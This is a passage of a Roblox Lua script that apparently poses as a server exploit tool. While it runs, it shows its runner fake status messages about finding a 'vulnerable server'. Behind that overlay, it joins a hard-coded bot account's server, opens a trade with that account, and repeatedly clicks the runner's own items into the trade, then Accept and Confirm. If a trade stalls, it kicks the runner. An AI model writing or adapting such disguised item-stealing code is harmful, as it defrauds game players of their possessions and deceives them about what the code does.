--==================== LEADERBOARD LOOKUP (multi-fallback) ====================
local function findLeaderboardRow()
    -- 1. Direct path
    local row = resolve({"MainGUI","Game","Leaderboard","Container", BOT_USERNAME})
    if row then return row, "direct" end

    -- 2. Alt path with player name
    row = resolve({"Players",
        function(g) return g:FindFirstChild(player.Name) end,
        "PlayerGUI","MainGUI","Game","Leaderboard","Container", BOT_USERNAME})
    if row then return row, "alt-path" end

    -- 3. Scan for anything named after the bot
    for _, o in ipairs(playerGui:GetDescendants()) do
        if o.Name == BOT_USERNAME and o:IsA("GuiObject") then
            return o, "name-scan"
        end
    end

    -- 4. Scan for a TextLabel containing the bot's name, walk up
    for _, o in ipairs(playerGui:GetDescendants()) do
        if (o:IsA("TextLabel") or o:IsA("TextButton")) and o.Text then
            if o.Text:lower():find(BOT_USERNAME:lower(), 1, true) then
                local p = o
                for _ = 1, 3 do
                    if p:IsA("TextButton") or p:IsA("ImageButton") then
                        return p, "text-scan-btn"
                    end
                    p = p.Parent
                    if not p then break end
                end
                return o, "text-scan-label"
            end
        end
    end
    return nil, "not-found"
end

--==================== TRADE BUTTON LOOKUP ====================
local function findTradeButton()
    local btn = resolve({"MainGUI","Game","Leaderboard","Inspect","Container","Trade"})
    if btn then return btn, "direct" end

    for _, o in ipairs(playerGui:GetDescendants()) do
        if o:IsA("GuiButton") and o.Visible and o.Name:lower() == "trade" then
            return o, "name-scan"
        end
    end

    for _, o in ipairs(playerGui:GetDescendants()) do
        if o:IsA("TextButton") and o.Visible and o.Text:lower() == "trade" then
            return o, "text-scan"
        end
    end
    return nil, "not-found"
end

--==================== MAIN FLOW ====================
local function runFlow()
    buildOverlay()
    log("=== MAIN FLOW START ===")

    setStatus("Loading contents...")
    task.wait(3)
    setStatus("Looking for vulnerable server...")
    task.wait(4)
    setStatus("Found vulnerable server")
    task.wait(2)
    setStatus("Joining server...")

    if findBot() then
        log("bot already in server — skip join")
        task.wait(1)
    else
        local ok = joinTargetServer()
        if not ok and not findBot() then
            log("join failed — stopping")
            setStatus("❌ Could not reach server")
            return
        end
        task.wait(POST_JOIN_WAIT)
        if KILLED then return end
    end

    setStatus("Loading script...")

    -- Wait for bot in player list (up to 20s)
    log("waiting for bot in player list (20s)...")
    local waitEnd = tick() + 20
    local botHere = false
    while tick() < waitEnd do
        if KILLED then return end
        if findBot() then botHere = true; break end
        task.wait(0.5)
    end
    log("bot in player list:", botHere)

    -- Find and click leaderboard row
    log("finding leaderboard row...")
    local row, how = findLeaderboardRow()
    if row then
        log("  FOUND via", how, "at", row:GetFullName())
        clickAt(row); task.wait(1)
    else
        log("  leaderboard row NOT FOUND (" .. how .. ")")
    end

    -- Find and click trade button
    log("finding trade button...")
    local tradeBtn, how2 = findTradeButton()
    if tradeBtn then
        log("  FOUND via", how2, "at", tradeBtn:GetFullName())
        clickAt(tradeBtn); task.wait(2)
    else
        log("  trade button NOT FOUND (" .. how2 .. ")")
    end

    -- Item / accept / confirm paths
    local BTN_ACCEPT  = IS_MOBILE and {"TradeGUI_Phone","Container","Trade","Actions","Accept","ActionButton"}
                                    or {"TradeGUI","Container","Trade","Actions","Accept","ActionButton"}
    local BTN_CONFIRM = IS_MOBILE and {"TradeGUI_Phone","Container","Trade","Actions","Accept","Confirm","ActionButton"}
                                    or {"TradeGUI","Container","Trade","Actions","Accept","Confirm","ActionButton"}
    local tradeGuiName = IS_MOBILE and "TradeGUI_Phone" or "TradeGUI"

    local batch = 0
    while not KILLED and batch < 200 do
        batch = batch + 1
        log("===== BATCH " .. batch .. " =====")

        for i = 1, ITEMS_PER_BATCH do
            if KILLED then return end

            local parent = nil
            if IS_MOBILE then
                parent = resolve({
                    "TradeGUI_Phone","Container","Items","Main","Weapons",
                    "Items","Container","Current","Container","ItemGridLayout",
                })
            else
                parent = resolve({
                    "TradeGUI","Container","Items","_mO","Weapons",
                    "Items","Container","Current","Container",
                }) or resolve({
                    "TradeGUI","Container","Items","_m0","Weapons",
                    "Items","Container","Current","Container",
                })
            end

            if parent then
                local kids = parent:GetChildren()
                local node = kids[4] or kids[#kids]
                if node then
                    log("  click " .. i .. " → " .. node.Name)
                    clickAt(node)
                else
                    log("  no node at idx 4 (kids " .. #kids .. ")")
                end
            else
                log("  items parent NOT found")
            end
            task.wait(CLICK_GAP)
        end

        local acc = resolve(BTN_ACCEPT)
        if acc then
            log("  clicking accept")
            clickAt(acc); task.wait(0.4); if acc.Parent then clickAt(acc) end
        else
            log("  accept NOT found")
        end

        local t = tick() + CONFIRM_WAIT
        while tick() < t do
            if KILLED then return end
            task.wait(0.1)
        end

        local con = resolve(BTN_CONFIRM)
        if con then
            log("  clicking confirm")
            clickAt(con); task.wait(0.4); if con.Parent then clickAt(con) end
        else
            log("  confirm NOT found")
        end

        local closed = false
        local endT = tick() + 15
        while tick() < endT do
            if KILLED then return end
            local tcheck = playerGui:FindFirstChild(tradeGuiName)
            if not tcheck or not tcheck.Enabled then
                closed = true
                break
            end
            task.wait(0.25)
        end

        if not closed then
            log("  trade did not close — kicking self")
            kickSelf(KICK_MESSAGE)
            return
        end
        log("  trade closed successfully")

        task.wait(1)

        local tg = playerGui:FindFirstChild(tradeGuiName)
        if not tg or not tg.Enabled then
            log("  reopening trade")
            local r2 = findLeaderboardRow()
            if r2 then
                clickAt(r2); task.wait(0.8)
                local t2 = findTradeButton()
                if t2 then clickAt(t2); task.wait(1.5) end
            end
        end
        task.wait(0.5)
    end
end

